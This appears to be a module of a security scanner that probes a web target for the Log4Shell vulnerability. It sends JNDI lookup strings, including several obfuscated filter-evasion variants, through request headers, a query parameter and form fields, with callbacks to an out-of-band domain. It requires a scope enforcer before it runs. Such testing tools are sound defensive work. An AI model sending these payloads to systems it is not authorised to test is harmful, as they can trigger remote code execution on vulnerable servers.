"""Log4Shell (CVE-2021-44228) scanner — JNDI injection across all inputs."""
from __future__ import annotations
import asyncio
import urllib.parse
from typing import Any

from talisman.engine.scope import ScopeViolationError
from talisman.utils.oast import normalize_oast_domain
from talisman.utils.http_client import TalismanHTTPClient
from talisman.utils.logger import get_logger, console, print_finding

log = get_logger(__name__)

LOG4SHELL_HEADERS = [
 "User-Agent", "X-Forwarded-For", "X-Api-Version", "X-Forwarded-Host",
 "Referer", "Origin", "Authorization", "X-Correlation-ID", "X-Request-ID",
 "Accept-Language", "CF-Connecting-IP", "True-Client-IP", "X-Real-IP",
 "X-Client-IP", "Contact", "Forwarded", "X-Originating-IP",
 "X-Remote-IP", "X-Remote-Addr", "X-ProxyUser-Ip",
]

def _build_payloads(callback_url: str) -> list[str]:
 domain = callback_url.replace("http://", "").replace("https://", "").rstrip("/")
 return [
  f"${{jndi:ldap://{domain}/a}}",
  f"${{${{lower:j}}ndi:${{lower:l}}dap://{domain}/a}}",
  f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:${{::-l}}${{::-d}}${{::-a}}${{::-p}}://{domain}/a}}",
  f"${{j${{::-n}}di:ldap://{domain}/a}}",
  f"${{jndi:rmi://{domain}/a}}",
  f"${{jndi:dns://{domain}/a}}",
  f"${{${{upper:j}}ndi:ldap://{domain}/a}}",
  f"${{${{env:NaN:-j}}ndi${{env:NaN:-:}}${{env:NaN:-l}}dap${{env:NaN:-:}}//{domain}/a}}",
 ]


async def run(
 target: str,
 session: Any = None,
 scope: Any = None,
 rate_limiter: Any = None,
 proxy: str | None = None,
 oast_domain: str | None = None,
 **kwargs: Any,
) -> dict[str, Any]:
 url = target if "://" in target else f"https://{target}"
 if scope is None:
  return {
   "target": url,
   "findings": [],
   "count": 0,
   "error": "scope_enforcer_required",
  }
 try:
  # JNDI probes can trigger remote code or server-side callbacks even on GET.
  scope.assert_destructive_allowed(url, "POST")
 except ScopeViolationError as exc:
  return {
   "target": url,
   "findings": [],
   "count": 0,
   "skipped": True,
   "reason": str(exc),
  }

 if not oast_domain:
  return {
   "target": url,
   "findings": [],
   "count": 0,
   "skipped": True,
   "reason": "A public OAST callback hostname is required for this probe.",
  }
 try:
  oast_domain = normalize_oast_domain(oast_domain)
 except ValueError as exc:
  return {
   "target": url,
   "findings": [],
   "count": 0,
   "error": str(exc),
  }

 console.print(
  f"\n[module][+] Log4Shell Candidate Probe[/module] -> [target]{url}[/target]"
 )
 payloads = _build_payloads(f"http://{oast_domain}")
 probes_sent = 0

 async with TalismanHTTPClient(
  proxy=proxy,
  timeout=10,
  scope=scope,
  verify_ssl=True,
  follow_redirects=False,
 ) as client:
  for header in LOG4SHELL_HEADERS:
   for payload in payloads[:3]:
    try:
     await client.get(url, headers={header: payload}, timeout=8)
     probes_sent += 1
    except Exception:
     pass

  for payload in payloads[:2]:
   try:
    await client.get(url + f"?q={urllib.parse.quote(payload)}", timeout=8)
    probes_sent += 1
    await client.post(
     url,
     data={"q": payload, "username": payload},
     timeout=8,
    )
    probes_sent += 1
   except Exception:
    pass

 console.print(
  f" Sent {probes_sent} JNDI probes. Confirm only from a matching OAST callback."
 )
 return {
  "target": url,
  "findings": [],
  "count": 0,
  "probes_sent": probes_sent,
  "oast_verification_required": True,
  "oast_domain": oast_domain,
 }
